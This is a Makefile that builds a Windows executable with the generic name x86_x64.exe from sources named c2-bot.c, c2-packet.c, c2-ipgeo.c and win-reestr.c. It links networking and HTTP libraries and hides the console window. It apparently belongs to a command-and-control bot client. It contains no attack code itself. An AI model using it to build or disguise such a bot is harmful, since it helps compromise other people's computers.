OUT_DIR = source

SRC_MAIN = x86_x64.c
SRC_BOT = c2-bot.c
SRC_IPGEO = c2-ipgeo.c
SRC_PACKET = c2-packet.c
SRC_WIN_REESTR = win-reestr.c

MAIN_OUT = $(OUT_DIR)/x86_x64.exe

CC = gcc
CFLAGS = -mwindows
LDFLAGS = -lws2_32
HTTPFLAGS = -lwinhttp
LAPIFLAGS = -liphlpapi

exe: $(MAIN_OUT)

$(MAIN_OUT): $(SRC_MAIN)
	@if not exist $(OUT_DIR) mkdir $(OUT_DIR)
	$(CC) $(SRC_MAIN) -o $(MAIN_OUT) $(SRC_BOT) $(SRC_IPGEO) $(SRC_PACKET) $(SRC_WIN_REESTR) $(CFLAGS) $(LDFLAGS) $(HTTPFLAGS) $(LAPIFLAGS)

ipgeo-test: $(OUT_DIR)/ipgeo.exe

$(OUT_DIR)/ipgeo.exe: ipgeo.c
	@if not exist $(OUT_DIR) mkdir $(OUT_DIR)
	$(CC) ipgeo.c -o $(OUT_DIR)/ipgeo.exe -lwinhttp -liphlpapi

clean:
	rm -f $(EXE_OUT) $(DLL_OUT)
